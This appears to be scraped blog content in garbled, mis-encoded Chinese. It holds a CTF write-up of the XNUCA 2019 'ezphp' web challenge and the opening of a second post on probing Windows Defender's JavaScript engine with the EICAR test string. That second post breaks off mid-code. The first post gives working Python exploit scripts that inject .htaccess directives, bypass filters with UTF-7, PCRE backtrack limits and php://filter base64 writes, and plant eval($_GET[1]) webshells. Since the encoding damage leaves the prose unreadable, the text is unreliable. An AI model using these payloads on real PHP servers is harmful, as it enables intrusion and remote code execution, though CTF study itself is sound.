çš„åˆ©ç”¨\u0026hellip;ç„¶åå°±åäº†\u0026hellip;\næœ‰äº†ä¸Šé¢˜çš„çŸ¥è¯†å…¶å®æˆ‘ä»¬ä¸éš¾æœ‰ä¸€äº›æ€è·¯ï¼šå¯ä»¥åˆ©ç”¨ç¼–ç ç»•è¿‡ä¸€äº›åˆ¤å®šï¼Œä¾‹å¦‚stristrå‡½æ•°çš„åˆ¤æ–­ã€‚\nè€Œä¸”è¿™é‡Œæ¯”è¾ƒè®©æˆ‘ä»¬å€¼å¾—æ³¨æ„çš„æ˜¯fl3g.phpçš„åŒ…å«ï¼Œè™½ç„¶æ¯æ¬¡éƒ½ä¼šé¦–å…ˆæ‰§è¡Œåˆ é™¤å½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶ï¼Œä½†æ˜¯ä¹‹ååˆéƒ½ä¼šå»å°è¯•åŒ…å«fl3g.phpï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥æœ‰ä»€ä¹ˆæ“ä½œå»å†™å…¥fl3g.phpå‘¢ï¼Ÿå½“ç„¶å¦‚æœé€šè¿‡é¢˜ç›®ç»™çš„å†™å…¥åŠŸèƒ½ç”±äºæœ‰[^a-z\\.]æ­£åˆ™çš„å­˜åœ¨æ˜¯è‚¯å®šå†™ä¸è¿›å»çš„ã€‚\näºæ˜¯æˆ‘ä»¬éœ€è¦æŠŠå†™å…¥æ–‡ä»¶çš„åŠŸèƒ½ç‚¹æ”¾åœ¨.htaccesså…³æ³¨ç‚¹ä¸Šæ¥ï¼Œæ ¹æ® How to change configuration settings ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨.htaccesså½“ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‡ ç§ç±»å‹æ ¼å¼æ¥æ›´æ”¹ php é…ç½®\nphp_value name value php_flag name on|off php_admin_value name value php_admin_flag name on|off è™½ç„¶flagè¢«ä½œä¸ºå…³é”®å­—è¿‡æ»¤äº†ï¼Œä½†æ˜¯æ— è®ºæ˜¯php_flagè¿˜æ˜¯php_amdin_flagåªæ˜¯php_valueçš„ç®€åŒ–ï¼Œèƒ½é€šè¿‡php_flagè®¾ç½®çš„å‚æ•°æˆ‘ä»¬å¤§éƒ¨åˆ†è¿˜æ˜¯éƒ½å¯ä»¥ç”¨php_valueå»è®¾ç½®çš„ï¼Œè™½ç„¶æ–‡æ¡£æœ‰ä»¥ä¸‹è¯´æ˜ï¼š\n â€‹\tNote: Don\u0026rsquo;t use php_value to set boolean values. php_flag (see below) should be used instead.\n åœ¨ List of php.ini directives å½“ä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æ”¯æŒæ›´æ”¹çš„ php é…ç½®é€‰é¡¹ï¼Œå…¶ä¸­æœ‰å‡ ä¸ªæˆ‘ä»¬å€¼å¾—å»å…³æ³¨ã€‚\nOne Way-error  â€‹\terror_log string\nName of the file where script errors should be logged. The file should be writable by the web server\u0026rsquo;s user. If the special value syslog is used, the errors are sent to the system logger instead. On Unix, this means syslog(3) and on Windows it means the event log. See also: syslog(). If this directive is not set, errors are sent to the SAPI error logger. For example, it is an error log in Apache or stderr in CLI. See also error_log().\n error_logå¯ä»¥æŠŠerror_reportingè®¾ç½®çš„é”™è¯¯ç­‰çº§å†™å…¥åˆ°è®¾ç½®çš„æ–‡ä»¶å½“ä¸­ï¼Œè¿™ä¸ªçœ‹èµ·æ¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°æ¥å°±è¿›è¡ŒæŠ¥é”™å†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯å¯¹äºä¸€å¼€å§‹å°±åˆ é™¤å½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶çš„æ“ä½œï¼Œå³ä½¿æˆ‘ä»¬å¯ä»¥å†™å…¥è‡ªå®šä¹‰å†…å®¹ï¼Œä¹Ÿä¼šè¢«åˆ é™¤ã€‚æ‰€ä»¥æˆ‘ä»¬å¯èƒ½è¿˜éœ€è¦æ‰¾å¦å¤–ä¸€æ¡è·¯å¾„ä½¿å¾—è¯¥æ–‡ä»¶å¯ä»¥ä¿å­˜ä¸‹æ¥ã€‚\n â€‹\tinclude_path string\nSpecifies a list of directories where the require, include, fopen(), file(), readfile() and file_get_contents() functions look for files. The format is like the system\u0026rsquo;s PATH environment variable: a list of directories separated with a colon in Unix or semicolon in Windows.\nPHP considers each entry in the include path separately when looking for files to include. It will check the first path, and if it doesn\u0026rsquo;t find it, check the next path, until it either locates the included file or returns with a warning or an error. You may modify or set your include path at runtime using set_include_path().\n åœ¨é˜…è¯»æ–‡æ¡£æˆ‘ä»¬è¿˜å¯ä»¥å‘ç°include_pathè¿™ä¸ªè®¾ç½®ï¼Œä»–å¯ä»¥æŒ‡å®šincludeç­‰åŒ…å«å‡½æ•°åŒ…å«çš„ç¯å¢ƒè·¯å¾„ï¼Œè€Œé¢˜ç›®ä»£ç ä½¿ç”¨çš„æ˜¯scandir('./'); ä½œä¸ºè·å–å½“å‰æ–‡ä»¶çš„æ“ä½œï¼Œåªæ˜¯åˆ é™¤å½“å‰æ–‡ä»¶ï¼Œè€Œerror_logåˆå¯ä»¥æŒ‡å®šè·¯å¾„ã€‚æ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚å¯ä»¥æœ‰è¿™ä¹ˆä¸ªæ€è·¯ï¼š\n ä½¿ç”¨error_logæŒ‡å®šä¸€ä¸ªéå½“å‰æ–‡ä»¶è·¯å¾„çš„å¯å†™è·¯å¾„ï¼Œä¾‹å¦‚/tmp/fl3g.php åˆ©ç”¨include_pathæŒ‡å®šåŒ…å«çš„ç¯å¢ƒè·¯å¾„ä¸º/tmp è¿™æ ·includeåŒ…å«çš„æ—¶å€™ï¼Œå°±æ˜¯åŒ…å«åˆ°äº†/tmp/fl3g.php  è¿™æ ·å°±å¯ä»¥ç»•è¿‡åˆ é™¤å½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶çš„æ“ä½œäº†ã€‚\næ¥ä¸‹æ¥å°±æ˜¯error_logå†™æ–‡ä»¶å†…å®¹çš„é—®é¢˜äº†ï¼Œè®©æˆ‘ä»¬æœ¬åœ°è¯•è¯•çœ‹ï¼Œä¸ºäº†æ–¹ä¾¿ï¼ŒæŒ‰ç…§ä¸Šé¢çš„æ€è·¯ç›´æ¥å†™ä¸€ä¸ª.htaccessåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ï¼Œå†…å®¹æ˜¯\nphp_value error_log /tmp/fl3g.php php_value include_path /tmp è®¿é—®index.phpï¼Œå¾—åˆ°çš„é”™è¯¯æœ‰\nWarning: include_once(fl3g.php): failed to open stream: No such file or directory in /xxx/index.php on line 10 Warning: include_once(): Failed opening \u0026#39;fl3g.php\u0026#39; for inclusion (include_path=\u0026#39;.:/Applications/MAMP/bin/php/php7.1.26/lib/php\u0026#39;) in /xxx/index.php on line 10 è¿™æ—¶å€™/tmp/fl3g.phpå½“ä¸­çš„å†…å®¹ä¹Ÿæ˜¯ä¸Šé¢çš„å†…å®¹ï¼Œè¿™æ—¶å€™.htaccesså› ä¸ºæˆ‘ä»¬è®¿é—®äº†è¿‡ä¸€æ¬¡index.phpè¢«åˆ é™¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†å†™ä¸€æ¬¡.htaccessï¼Œè¿˜æ˜¯ä¸€æ ·çš„å†…å®¹ã€‚\næ¥ç€è®¿é—®index.phpï¼Œå¯ä»¥çœ‹è§æˆ‘ä»¬åŒ…å«çš„æ•ˆæœå¦‚ä¸‹ï¼š\n \nä¹‹åæˆ‘ä»¬å°±è¦æ€è€ƒæ€ä¹ˆæŠŠä¸€äº›æ¶æ„ä»£ç æ’åˆ°æŠ¥é”™çš„å†…å®¹å½“ä¸­äº†ã€‚\næ—¢ç„¶ä¸Šé¢éƒ½æ˜¯é€šè¿‡includeä¸å­˜åœ¨çš„æ–‡ä»¶äº§ç”ŸæŠ¥é”™ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥åˆ©ç”¨include_pathæ¥æ„é€ ä¸€äº›é”™è¯¯ã€‚\nä¾‹å¦‚æˆ‘ä»¬å¯ä»¥é¦–å…ˆé€šè¿‡è¿™ä¹ˆæ¥æ„é€ ä¸€ä¸ªä¸å­˜åœ¨çš„åŒ…å«è·¯å¾„è®©æ¶æ„ä»£ç æ’å…¥åˆ°/tmp/fl3g.phpå½“ä¸­ï¼Œ.htaccessæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\nphp_value error_log /tmp/fl3g.php php_value include_path '\u0026lt;?php phpinfo();?\u0026gt;' è®¿é—®index.phpæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼š\n \nè¿™é‡Œ\u0026lt;è¢«è¿›è¡Œäº† html ç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™æ ·å»ç”¨include_path '/tmp'åŒ…å«çš„/tmp/fl3g.phpï¼Œè‡ªç„¶ä¹Ÿä¸å¯èƒ½æ‰§è¡Œä»£ç ã€‚æ‰€ä»¥æˆ‘ä»¬å¯èƒ½éœ€è¦ä¸€äº›æŠ€å·§æ¥ä½¿å¾—è¿™äº›å¯ä»¥è¢«è§£æã€‚\næœ‰äº†ä¸Šä¸€é¢˜çš„åŸºç¡€ï¼Œæˆ‘ä»¬çŸ¥é“å¯ä»¥ä½¿ç”¨ç¼–ç æ¥è¿›è¡Œè§£ææ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç”¨ UTF-7 ç¼–ç å†™å…¥ï¼Œå†åˆ©ç”¨.htaccessè§£ç  UTF-7\næ‰€ä»¥ï¼Œå…ˆå°è¯•åˆ©ç”¨ UTF-7 ç¼–ç æˆ‘ä»¬éœ€è¦æ’å…¥çš„æ¶æ„ä»£ç ï¼Œå†™å…¥.htaccessçš„æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\nphp_value error_log /tmp/fl3g.php php_value include_path '+ADw?php phpinfo()+ADs?+AD4-' ç„¶åè®¿é—®index.phpè§¦å‘æŠ¥é”™å†™å…¥ log æ–‡ä»¶/tmp/fl3g.phpï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\n[03-Oct-2019 16:23:51 Asia/Shanghai] PHP Warning: include_once(fl3g.php): failed to open stream: No such file or directory in /xxx/index.php on line 10 [03-Oct-2019 16:23:51 Asia/Shanghai] PHP Warning: include_once(): Failed opening 'fl3g.php' for inclusion (include_path='+ADw?php phpinfo()+ADs?+AD4-') in /xxx/index.php on line 10 å†æŠŠä»¥ä¸‹å†…å®¹å†™å…¥.htaccessï¼š\nphp_value error_log /tmp/fl3g.php php_value include_path '/tmp' php_value zend.multibyte 1 php_value zend.script_encoding \u0026quot;UTF-7\u0026quot; è®¿é—®index.php\n \nå¾—åˆ° php-info\nå½“ç„¶è¿™é‡Œç¼–ç ç±»å‹æœ‰å¾ˆå¤šï¼Œä¸ä»…ä»…åªæ˜¯ UTF-7\n\\n è‡³äºæœ€åçš„\\nJust one chanceï¼Œå› ä¸ºå®ƒå½±å“åˆ°äº†.htaccessæ–‡ä»¶è§£æï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆæƒ³åˆ°çš„è‚¯å®šæ˜¯åˆ©ç”¨#æ³¨é‡Šç¬¦å°†æ•´å¥è¯éƒ½æ³¨è§†æ‰ï¼Œä½†æ˜¯åˆç”±äºæœ‰\\næ¢è¡Œç¬¦çš„å­˜åœ¨ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥ä½¿ç”¨#å°±å°†å…¶æ³¨é‡Šæ‰ï¼Œéœ€è¦æŠŠ\\nè¿›è¡Œâ€œåƒâ€æ‰ã€‚\né‚£ä¹ˆæœ€å¸¸è§çš„æ“ä½œå°±æ˜¯åˆ©ç”¨\\æ–œæ å°†å…¶è½¬ä¹‰äº†ï¼Œè¿™æ ·\\\\nå°±æ˜¯ä¸€ä¸ªç®€å•çš„\\nå­—ç¬¦ä¸²äº†ã€‚\nExp:\nPAYLOAD1 = \u0026#34;\u0026#34;\u0026#34;php_value error_log /tmp/fl3g.php php_value error_reporting 32767 php_value include_path \u0026#34;+ADw?php eval($_GET[1])+ADs?+AD4-\u0026#34; # \\\\\u0026#34;\u0026#34;\u0026#34; PAYLOAD2 = \u0026#34;\u0026#34;\u0026#34;php_value include_path \u0026#34;/tmp\u0026#34; php_value zend.multibyte 1 php_value zend.script_encoding \u0026#34;UTF-7\u0026#34; # \\\\\u0026#34;\u0026#34;\u0026#34; URL = \u0026#34;http://xxx/index.php\u0026#34; def upload_content(name, content): data = { \u0026#34;content\u0026#34; : content, \u0026#34;filename\u0026#34; : name, } return requests.get(URL, params=data) rep = upload_content(\u0026#34;.htaccess\u0026#34;, PAYLOAD1) print(rep.text) rep = upload_content(\u0026#34;.htaccess\u0026#34;, PAYLOAD2) print(rep.text) Another Way-Pcre æ‰‹å†Œä¸­è¿˜å…è®¸è®¾ç½® pcre.backtrack_limit ï¼Œè¿™ä¸ªå¯ä»¥æ›´æ”¹æ­£åˆ™å›æº¯çš„æ¬¡æ•°ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶\nè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°é¢˜ç›®çš„ä»£ç æ­£åˆ™éƒ¨åˆ†æ˜¯\nif(preg_match(\u0026#34;/[^a-z\\.]/\u0026#34;, $filename) == 1) { echo \u0026#34;Hacker2\u0026#34;; die(); } è¿™é‡Œæ˜¯åˆ¤æ–­æ˜¯å¦ä¸º 1 ï¼Œå¦‚æœä¸º 1 åˆ™ die ï¼Œè€Œæ ¹æ®æ­£åˆ™å›æº¯ï¼Œå½“è¶…è¿‡å›æº¯æ¬¡æ•°ï¼Œpreg_matchä¼šè¿”å›falseï¼Œè‡ªç„¶å°±å¯ä»¥ç»•è¿‡äº†ã€‚\nphp_value pcre.backtrack_limit 0 php_value pcre.jit 0 æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼ ä»¥ä¸Šå†…å®¹åˆ°.htaccessï¼Œåˆ©ç”¨è¿™ä¸ªå›æº¯ç‰¹æ€§å¯ä»¥ç»•è¿‡ filename çš„æ£€æµ‹ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å¯¹ filename åšç‚¹ä»€ä¹ˆæ“ä½œå‘¢ï¼Ÿç›´æ¥å†™å…¥ fl3g.php ï¼Ÿèµ°ä½ \nimport requests PAYLOAD3 = \u0026#34;\u0026#34;\u0026#34;php_value pcre.backtrack_limit 0 php_value pcre.jit 0 # \\\\\u0026#34;\u0026#34;\u0026#34; PAYLOAD4 = \u0026#34;\u0026#34;\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;\u0026#34;\u0026#34; URL = \u0026#34;http://xxx/index.php\u0026#34; def upload_content(name, content): data = { \u0026#34;content\u0026#34; : content, \u0026#34;filename\u0026#34; : name, } return requests.get(URL, params=data) rep = upload_content(\u0026#34;.htaccess\u0026#34;, PAYLOAD3) print(rep.text) rep = upload_content(\u0026#34;fl3g.php\u0026#34;, PAYLOAD4) print(rep.text) ç„¶åç›´æ¥è®¿é—® fl3g.php å³å¯ã€‚\nROIS è¿™é‡Œä½¿ç”¨äº†ä¸€ç§æ¯”è¾ƒå¤æ‚çš„æ–¹æ³•ï¼Œé¦–å…ˆåŒæ ·ä¸Šä¼ .htaccessæŠŠ pcre å›æº¯é™åˆ¶æ”¹æˆ 0ï¼Œç„¶åä½¿ç”¨ base64 å†™æ–‡ä»¶ç»•è¿‡stristrçš„åˆ¤æ–­ï¼Œä½¿ç”¨auto_append_fileåŒ…å«.htaccessï¼Œåœ¨.htaccesså½“ä¸­å†™æ³¨é‡Š webshell å³å¯ã€‚\né¦–å…ˆä¸Šä¼ .htaccessï¼Œå†…å®¹ä¸ºï¼š\nphp_value pcre.backtrack_limit 0 php_value pcre.jit 0 å†æ¬¡ä¸Šä¼ åä¸ºphp://filter/write=convert.base64-decode/resource=.htaccessï¼Œå†…å®¹ä¸º\ncGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKCnBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCgpwaHBfdmFsdWUgcGNyZS5qaXQgICAwCgojPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c base64 è§£ç çš„å†…å®¹æ˜¯\nphp_value pcre.backtrack_limit 0 php_value auto_append_file \u0026quot;.htaccess\u0026quot; php_value pcre.jit 0 #\u0026lt;?php eval($_GET[1]);?\u0026gt;\\ Exp:\nimport requests PAYLOAD5 = \u0026#34;\u0026#34;\u0026#34;php_value pcre.backtrack_limit 0 php_value pcre.jit 0 # \\\\\u0026#34;\u0026#34;\u0026#34; PAYLOAD6 = \u0026#34;\u0026#34;\u0026#34;cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKCnBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCgpwaHBfdmFsdWUgcGNyZS5qaXQgICAwCgojPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c\u0026#34;\u0026#34;\u0026#34; URL = \u0026#34;http://zedd.cc/xnuca/index.php\u0026#34; def upload_content(name, content): data = { \u0026#34;content\u0026#34; : content, \u0026#34;filename\u0026#34; : name, \u0026#34;1\u0026#34;: \u0026#34;echo \u0026#39;Done!\u0026#39;;\u0026#34; } return requests.get(URL, params=data) rep = upload_content(\u0026#34;.htaccess\u0026#34;, PAYLOAD5) print(rep.text) rep = upload_content(\u0026#34;php://filter/write=convert.base64-decode/resource=.htaccess\u0026#34;, PAYLOAD6) print(rep.text) Another Way-backward slash æ—¢ç„¶èƒ½ç”¨\\ç»•è¿‡æœ€åçš„\\nï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ¥ç»•è¿‡stristrï¼Œè€Œä¸”ä¸å½±å“.htaccessçš„è§£æ\nExp:\nimport requests PAYLOAD7 = \u0026#34;\u0026#34;\u0026#34;php_value auto_prepend_fi\\\\le \u0026#34;.htaccess\u0026#34; #\u0026lt;?php phpinfo();?\u0026gt;\\\\\u0026#34;\u0026#34;\u0026#34; URL = \u0026#34;http://xxx/index.php\u0026#34; def upload_content(name, content): data = { \u0026#34;content\u0026#34; : content, \u0026#34;filename\u0026#34; : name, } return requests.get(URL, params=data) rep = upload_content(\u0026#34;.htaccess\u0026#34;, PAYLOAD7) print(rep.text) å¯ä»¥ä¸€æ­¥åˆ°ä½\n \nReference Insomnihack Teaser 2019 / l33t-hoster\nl33t-hoster\nXNUCA2019 ezç³»åˆ—webé¢˜è§£\nX-NUCA 2019 çº¿ä¸Šèµ› Writeup By ROIS\n","date":"2019-10-03T19:19:21Z","permalink":"https://blog.zeddyu.info/2019/10/03/xnuca-2019-ezphp/","title":"XNUCA 2019 Qualifier Ezphp"},{"content":"åœ¨ä»Šå¹´çš„ WCTF 2019 ä¸Šï¼ŒTokyo Westerns å‡ºäº†ä¸€é“ä¸ Windows Defender ä¾§ä¿¡é“æ”»å‡»ç›¸å…³çš„é¢˜ç›®ï¼Œåœ¨ Tokyo Westerns CTF 2019 ä¸Šä¹Ÿæœ‰ä¸€é“ä¸ä¹‹æœ‰å…³çš„é¢˜ç›® PHP Noteï¼Œçœ‹äº†æ„Ÿè§‰æ¯”è¾ƒæœ‰è¶£ï¼Œä½†æ˜¯æˆ‘çœ‹çš„ç½‘ç»œæ–‡ç« å†™çš„éƒ½æ¯”è¾ƒç²—ç•¥ï¼Œè¿™é‡Œæˆ‘å°±è®°å½•ä¸€ä¸‹è‡ªå·±çš„åˆ†æã€‚\nWindows Defender ä¼—æ‰€å‘¨çŸ¥ï¼ŒWindows Defender æ˜¯ Windows 10 å¹³å°ä¸Šä¸€æ¬¾è‡ªå¸¦çš„å®‰å…¨é˜²æŠ¤è½¯ä»¶ï¼Œæ¸¸æˆå¼¹çª—æ€æ‰‹\n{% colorquote info %}\nWindows Defenderï¼ˆWindows 10 åˆ›æ„è€…æ›´æ–°ååä¸ºWindows Defender Antivirusï¼‰ï¼Œæ›¾ç”¨åMicrosoft AntiSpywareï¼Œæœ€åˆæ˜¯ç”¨æ¥ç§»é™¤ã€éš”ç¦»å’Œé¢„é˜²é—´è°è½¯ä»¶çš„ç¨‹åºï¼Œå¯ä»¥è¿è¡Œåœ¨Windows XPä»¥åŠæ›´é«˜ç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸Šï¼Œå¹¶å·²ç»å†…ç½®åœ¨Windows Vistaä»¥åŠä»¥åçš„ç‰ˆæœ¬ä¸­ã€‚Windows Defenderçš„å®šä¹‰åº“æ›´æ–°å¾ˆé¢‘ç¹ã€‚åœ¨Windows 8åŠä¹‹åçš„ç³»ç»Ÿä¸­å–ä»£Microsoft Security Essentialsï¼Œæˆä¸ºä¸€æ¬¾å…¨é¢åç—…æ¯’è½¯ä»¶ã€‚\nWindows Defenderä¸åƒæŸäº›å…¶ä»–åŒç±»å…è´¹äº§å“ä¸€æ ·åªèƒ½æ‰«æç³»ç»Ÿï¼Œè¿˜å¯ä»¥å¯¹ç³»ç»Ÿè¿›è¡Œå®æ—¶ç›‘æ§ï¼Œç§»é™¤å·²ç»å®‰è£…çš„ActiveXæ’ä»¶ï¼Œæ¸…é™¤å¤§å¤šæ•°å¾®è½¯çš„ç¨‹åºå’Œå…¶ä»–å¸¸ç”¨ç¨‹åºçš„å†å²çºªå½•ã€‚\n{% endcolorquote %}\nWhat Windows Defender will do æ ¹æ® TW çš„åˆ†æï¼ŒWindows Defender ä¼šæœ‰ä»¥ä¸‹è¡Œä¸ºï¼š\n æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦æœ‰æ¶æ„å†…å®¹ æ”¹å˜æ¶æ„æ–‡ä»¶çš„æƒé™ä»¥é¿å…ç”¨æˆ·å»åŠ è½½ æ›¿æ¢æ¶æ„å†…å®¹ä¸ºç©º åˆ é™¤æ•´ä¸ªæ–‡ä»¶  åœ¨ç¬¬äºŒæ­¥ä¸­ï¼Œå¦‚æœæ–‡ä»¶è¢« Windows Defender æ£€æµ‹å‡ºæ˜¯æ¶æ„æ–‡ä»¶çš„è¯ï¼Œç”¨æˆ·å°±ä¸å¯ä»¥è®¿é—®äº†ã€‚\nMake Windows Defender Angry EICAR {% colorquote info %}\nEICARæ ‡å‡†åç—…æ¯’æµ‹è¯•æ–‡ä»¶ï¼Œåˆç§°EICARæµ‹è¯•æ–‡ä»¶, æ˜¯ç”±æ¬§æ´²åè®¡ç®—æœºç—…æ¯’åä¼šï¼ˆEICARï¼‰ä¸è®¡ç®—æœºç—…æ¯’ç ”ç©¶ç»„ç»‡ï¼ˆCAROï¼‰ç ”åˆ¶çš„æ–‡ä»¶, ç”¨ä»¥æµ‹è¯•æ€æ¯’è½¯ä»¶çš„å“åº”ç¨‹åº¦ã€‚ä¸åŒäºä½¿ç”¨å¯èƒ½é€ æˆå®é™…ç ´ç¯çš„å®ä½“æ¶æ„è½¯ä»¶ï¼Œè¯¥æ–‡ä»¶å…è®¸äººä»¬åœ¨æ²¡æœ‰è®¡ç®—æœºç—…æ¯’çš„æƒ…å†µä¸‹æµ‹è¯•æ€æ¯’è½¯ä»¶ã€‚\n{% endcolorquote %}\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å­—ç¬¦ä¸²æµ‹è¯• Windows Defender\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* åªéœ€è¦å°†è¿™ä¸ªå­—ç¬¦ä¸²å¤åˆ¶ï¼Œç„¶åä¿å­˜åœ¨ä¸€ä¸ªç©ºç™½çš„ txt æ–‡ä»¶å½“ä¸­å³å¯è§¦å‘ Windwos Defenderï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆé€šè¿‡è¿™ä¸ªæ ·ä¾‹æ¥æ£€æŸ¥ä¸€ä¸‹è‡ªå·±çš„ Windows Defender æ˜¯å¦å¼€å¯ã€‚\nMpengine.dll æ ¹æ® Tokyo Westerns çš„åˆ†æï¼ŒWindows Defender æœ‰ä¸€ä¸ªæ ¸å¿ƒ dll æ–‡ä»¶ Mpengine.dll ï¼Œä»–å¯ä»¥å¯¹ä¸åŒçš„å†…å®¹è¿›è¡Œåˆ†æï¼ŒåŒ…æ‹¬ä¸€äº› base64 encode/RAR archived/etc. ï¼Œå…¶ä¸­æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯å®ƒè¿˜æœ‰ä¸€ä¸ª Javascript Engineã€‚\nè¿™ä¸ªå¼•æ“å¯ä»¥åˆ†æ HTML æ–‡æ¡£ï¼Œå¹¶ä¸”å¯ä»¥åˆ†æå…¶ä¸­çš„ Javascript ä»£ç ï¼ŒåŒ…æ‹¬å¯¹æ–‡æ¡£ä¸­çš„ DOM å…ƒç´ çš„è®¿é—®ã€‚\næˆ‘ä»¬å¯ä»¥åšä¸ªç®€å•çš„éªŒè¯ï¼Œæˆ‘ä»¬å…ˆåªä½¿ç”¨ä»¥ä¸‹ä»£ç æµ‹è¯•ï¼š\nvar mal = \u0026#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\u0026#34;;  \nå¯ä»¥å‘ç°æˆ‘ä»¬å¹¶æ²¡æœ‰è§¦å‘ Windows Defenderï¼Œå³ä½¿å­—ç¬¦ä¸²æ˜¯ EICAR æµ‹è¯•æ ·æœ¬ï¼Œè¯´æ˜äº†å­—ç¬¦ä¸²ä¸å— EICAR ç‰¹å¾å½±å“ã€‚\næ¥ç€æˆ‘ä»¬å°è¯•æ·»åŠ ä¸€ä¸‹evalï¼š\nvar mal = \u0026#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\u0026#34;; eval(mal);  \næ²¡é”™ï¼Œåœ¨ä¿å­˜çš„æ—¶å€™å°±ç«‹é©¬è§¦å‘äº† Windows Defender ï¼Œè¶³ä»¥éªŒè¯å½“ä¸­æœ‰ä¸€ä¸ª Javascript Engine è¿›è¡Œäº†å†…å®¹æ£€æµ‹ï¼Œè€Œä¸”å³ä½¿æ²¡æœ‰å®Œæ•´çš„ Javascript æ ‡ç­¾ï¼Œä¹Ÿå¯ä»¥è§¦å‘ Windows defenderã€‚\nInteresting Check æ¥ä¸‹æ¥æˆ‘ä»¬å†çœ‹å‡ ä¸ªæµ‹è¯•ä¾‹å­ï¼š\n\u0026lt;script\u0026gt; var mal = \u0026#34;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\u0026#34;; eval(mal); \u0026lt;/script\u0026gt;  \néå¸¸æ£’ï¼Œå¹¶æ²¡æœ‰è¢«æ£€æµ‹å‡ºæ¶æ„å†…å®¹ã€‚\næ¥ç€æˆ‘ä»¬å†è¯•ç€åŠ ä¸€ä¸ª\u0026lt;body\u0026gt;æ ‡ç­¾:\n\u0026lt;script\u0026gt; var mal = \u0026#34;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\u0026#34;; eval(mal); \u0026lt;/script\u0026gt; \u0026lt;body\u0026gt;\u0026lt;/body\u0026gt;  \nä¹Ÿå¾ˆæ£’ï¼Œä¹Ÿæ²¡æœ‰æ£€æµ‹å‡ºæ¶æ„å†…å®¹ã€‚\nè®©æˆ‘ä»¬å†æ“ä½œä¸€ä¸‹ DOM å…ƒç´ ï¼š\n\u0026lt;script\u0026gt; var body = document.body.innerHTML; var mal = \u0026#34;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\u0026#34;; eval(mal); \u0026lt;/script\u0026gt; \u0026lt;body\u0026gt;\u0026lt;/body\u0026gt;  \nDone! è§¦å‘äº†æ¶æ„å†…å®¹æ£€æµ‹ã€‚\né‚£å¦‚æœæˆ‘ä»¬æŠŠ EICAR å†…å®¹è¿›è¡Œä¸€ä¸‹æ‹†åˆ†å‘¢ï¼Ÿ\n\u0026lt;script\u0026gt; var body = document.body.innerHTML; var mal = \u0026#34;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\u0026#34; + body[0]; eval(mal); \u0026lt;/script\u0026gt; \u0026lt;body\u0026gt;a\u0026lt;/body\u0026gt;  \nè¿™é‡Œæˆ‘ä»¬è·å–çš„æ˜¯\u0026lt;body\u0026gt;æ ‡ç­¾ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯aï¼Œä¸æ„æˆ EICAR æµ‹è¯•æ ·æœ¬ï¼Œæ‰€ä»¥è§¦å‘ä¸äº† Windows Defender ä¹Ÿå¾ˆæ­£å¸¸ã€‚\né‚£æˆ‘ä»¬æ”¹ä¸€ä¸‹\u0026lt;body\u0026gt;æ ‡ç­¾å½“ä¸­çš„å†…å®¹å‘¢ï¼Ÿä½¿ç”¨*è¯•è¯•çœ‹\n\u0026lt;script\u0026gt; var body = document.body.innerHTML; 